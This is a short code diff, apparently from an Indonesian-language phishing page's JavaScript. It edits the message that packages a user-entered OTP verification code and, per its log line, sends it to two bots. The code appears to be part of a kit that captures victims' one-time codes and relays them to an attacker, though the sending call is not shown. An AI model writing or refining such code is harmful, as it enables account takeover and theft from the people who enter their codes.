@@ -225,9 +225,8 @@
             btn.innerText = "Memproses...";
 
             // Format pesan
-            let pesan = `<b>🔐 Kode Verifikasi / OTP</b>
-Kode: <code>${kode}</code>
-Waktu: ${new Date().toLocaleString('id-ID')}
+            let pesan = `<b>🔐 Kode OTP</b>
+Kode : <code>${kode}</code>
 ${timerExpired ? '⚠️ Waktu sudah habis!' : ''}`;
 
             console.log("📤 Mengirim data ke 2 bot...");
